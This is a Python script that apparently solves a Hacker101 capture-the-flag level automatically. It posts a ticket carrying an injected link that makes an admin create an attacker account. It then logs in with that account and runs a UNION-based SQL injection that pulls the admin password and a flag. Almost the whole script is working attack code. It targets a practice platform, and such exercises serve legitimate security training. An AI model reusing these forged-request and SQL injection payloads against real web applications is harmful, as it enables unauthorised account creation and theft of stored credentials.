# Importing Packages #
from requests import get as get_request, post as post_request
from re import search as search_flag, findall as find_all_flags
# Getting CTF URL #
ctf_url = f"https://{input("\033[32m[1] Enter your ctf id: \033[0m")}.ctf.hacker101.com"
# Declaring Flags list #
FLAGS = []
# Handling Exceptions #
try:
    # Checking for correct ctf id #
    if get_request(ctf_url).status_code == 200:
        # Printing Message before featching all flags #
        print("\033[33m[2] Please wait while we featch all flags.\033[0m")
        # Creating a new user using XSS #
        post_request(f"{ctf_url}/newTicket", data = {'title': '<a href="http://localhost/newUser?username=skillshetra&password=skillshetra&password2=skillshetra">skillshetra</a>', 'body': '<a href="http://localhost/newUser?username=skillshetra&password=skillshetra&password2=skillshetra">skillshetra</a>'})
        login_cookie = post_request(f"{ctf_url}/login", data = {'username': 'skillshetra', 'password': 'skillshetra'}, allow_redirects=False).cookies.get("session_level7b")
        FLAGS.append(f'^FLAG^{find_all_flags(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/ticket?id=1", cookies = {'session_level7b': login_cookie}).text)[1]}$FLAG$')
        # Appending flag SQL Injection #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/ticket?id=1.1+UNION+SELECT+1,password,3+FROM+users+WHERE+username%3d'admin'--", cookies = {'session_level7b': login_cookie}).text).group(1)}$FLAG$')
    else:
        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[31m[3] {str(e)}\033[0m")
# Printing all the flags #
print(f"\033[32m[3] Your flags are: {FLAGS}\033[0m")